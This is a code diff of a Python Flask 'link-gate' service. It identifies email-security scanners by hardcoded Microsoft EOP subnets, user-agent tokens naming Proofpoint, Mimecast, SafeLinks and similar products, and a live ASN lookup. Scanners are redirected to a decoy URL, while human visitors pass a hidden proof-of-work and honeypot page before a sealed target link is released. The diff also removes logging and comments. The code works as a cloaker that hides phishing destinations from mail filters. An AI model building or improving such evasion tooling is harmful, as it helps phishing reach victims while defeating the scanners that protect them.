@@ -35,46 +35,15 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
-# scanner networks & UAs
+# Hardcoded Microsoft EOP / Azure Blocks (The ASN check misses these)
 # ---------------------------------------------------------------------------
-EOP = [
+MICROSOFT_EOP = [
     ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
     ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
     ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
     ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
-PROOFPOINT = [
-    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
-    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
-    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
-    ip_network("62.128.218.0/23"),
-    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
-]
-MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
-BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
-TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
-GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
-YAHOO_AOL = [
-    ip_network("66.163.160.0/19"), ip_network("74.6.0.0/16"),
-    ip_network("98.136.0.0/14"), ip_network("98.137.0.0/16"),
-    ip_network("98.138.0.0/15"), ip_network("98.139.0.0/16"),
-    ip_network("98.140.0.0/14"), ip_network("108.160.160.0/20"),
-    ip_network("188.125.64.0/19"), ip_network("203.84.192.0/19"),
-]
-VERIZON = [
-    ip_network("72.52.0.0/14"), ip_network("96.16.0.0/12"), ip_network("108.6.0.0/16"),
-]
-SCANNER_NETS = {
-    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
-    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
-    "yahoo_aol": YAHOO_AOL, "verizon": VERIZON,
-    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
-    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
-    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
-    "cloudflare_email": [ip_network("104.30.0.0/18")],
-    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
-    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
-}
+
 SCANNER_UA_TOKENS = (
     "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast",
     "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro",
@@ -91,33 +60,67 @@ SCANNER_UA_TOKENS = (
     "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright",
     "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7",
     "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
+    "appriver", "zix", "apptix", "intermedia", "rackspace",
+)
+
+SUSPICIOUS_ASNS = (
+    "AMAZON", "AWS", "GOOGLE", "MICROSOFT", "AZURE", "DIGITALOCEAN", "OVH", 
+    "HETZNER", "LINODE", "CLOUDFLARE", "FASTLY", "AKAMAI", "ALIBABA", "TENCENT",
+    "PROOFPOINT", "MIMECAST", "BARRACUDA", "ZSCALER", "FORCEPOINT", "IRONPORT",
+    "SOPHOS", "KASPERSKY", "TREND", "SYMANTEC", "VADE", "RETARUS", "HORNET"
 )
 
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else request.remote_addr or ""
 
+def check_asn(ip: str) -> bool:
+    if ip.startswith(("127.", "192.168.", "10.", "172.")):
+        return False
+    try:
+        r = httpx.get(f"http://ip-api.com/json/{ip}?fields=status,as", timeout=2.0)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("status") == "success":
+                asn = data.get("as", "").upper()
+                for sus in SUSPICIOUS_ASNS:
+                    if sus in asn:
+                        return True
+    except Exception:
+        pass
+    return False
+
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
+    
+    # 1. Check User-Agent
+    for tok in SCANNER_UA_TOKENS:
+        if tok in low:
+            out["scanner"] = True
+            out["source"] = tok
+            out["method"] = "ua"
+            return out
+
+    # 2. Check Hardcoded Microsoft EOP Subnets
     try:
-        a = ip_address(ip)
+        addr = ip_address(ip)
+        for net in MICROSOFT_EOP:
+            if addr in net:
+                out["scanner"] = True
+                out["source"] = "microsoft_eop"
+                out["method"] = "ip_static"
+                return out
     except ValueError:
-        a = None
-    if a is not None:
-        for name, nets in SCANNER_NETS.items():
-            if any(a in n for n in nets):
-                out["scanner"] = True
-                out["source"] = name
-                out["method"] = "ip"
-                return out
-    if not out["scanner"]:
-        for tok in SCANNER_UA_TOKENS:
-            if tok in low:
-                out["scanner"] = True
-                out["source"] = tok
-                out["method"] = "ua"
-                return out
+        pass
+
+    # 3. Live Datacenter ASN Lookup
+    if check_asn(ip):
+        out["scanner"] = True
+        out["source"] = "datacenter_asn"
+        out["method"] = "asn"
+        return out
+        
     return out
 
 def unseal_payload(blob):
@@ -144,9 +147,6 @@ def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
-# ---------------------------------------------------------------------------
-# INVISIBLE LANDING PAGE WITH HONEYPOT
-# ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -159,8 +159,6 @@ LANDING = """<!DOCTYPE html>
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h1 { font-size: 18px; font-weight: 500; color: #555; }
-        
-        /* Honeypot field hidden from humans, but visible to bots parsing HTML */
         .hp-field { position: absolute; left: -9999px; top: -9999px; opacity: 0; height: 0; width: 0; z-index: -1; }
     </style>
 </head>
@@ -171,9 +169,7 @@ LANDING = """<!DOCTYPE html>
     </div>
     
     <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
-        <!-- Honeypot field: Real users won't fill this because it's hidden -->
         <input type="text" name="email_confirm_hp" id="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
-        
         <input type="hidden" name="n" value="{{ nonce }}">
         <input type="hidden" name="t" value="{{ token }}">
         <input type="hidden" name="challenge" value="{{ challenge }}">
@@ -184,7 +180,6 @@ LANDING = """<!DOCTYPE html>
         async function solveChallenge() {
             const seed = "{{ challenge }}";
             let nonce = 0; let hash = "";
-            
             while (!hash.startsWith("0000")) {
                 nonce++;
                 const data = new TextEncoder().encode(seed + nonce);
@@ -192,26 +187,17 @@ LANDING = """<!DOCTYPE html>
                 const hashArray = Array.from(new Uint8Array(hashBuffer));
                 hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
             }
-
             document.getElementById("pow_nonce").value = nonce;
-            
-            // 3 second behavioral delay
-            setTimeout(() => {
-                document.getElementById("challenge-form").submit();
-            }, 3000);
+            setTimeout(() => { document.getElementById("challenge-form").submit(); }, 3000);
         }
-        
         window.onload = solveChallenge;
     </script>
 </body>
 </html>"""
 
-# ---------------------------------------------------------------------------
-# routes
-# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
-    return jsonify({"ok": True, "ts": int(time.time())})
+    return jsonify({"ok": True})
 
 @app.route("/", methods=["GET"])
 def root():
@@ -233,7 +219,6 @@ def landing(token: str):
 
     if tag["scanner"]:
         unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
-        log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
         return redirect(unwanted, code=302)
 
     challenge_seed = secrets.token_hex(16)
@@ -257,10 +242,7 @@ def execute(token: str):
     if tag["scanner"]:
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
-    # 1. HONEYPOT CHECK
-    # If the bot filled out the hidden field, block it immediately.
     if request.form.get("email_confirm_hp"):
-        log.info(json.dumps({"event": "honeypot_blocked", "ip": client_ip()}))
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
     cookie_val = request.cookies.get("gate_session", "")
@@ -275,7 +257,6 @@ def execute(token: str):
     if not hmac.compare_digest(nonce_data.get("t", ""), token):
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
-    # 2. PoW CHECK
     submitted_pow = request.form.get("pow_nonce", "")
     seed = nonce_data.get("challenge", "")
     
@@ -286,7 +267,6 @@ def execute(token: str):
     if not test_hash.startswith("0000"):
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
-    # All checks passed
     data = unseal_payload(token)
     if not data or "target" not in data:
         return redirect(UNWANTED_REDIRECT_URL, code=302)
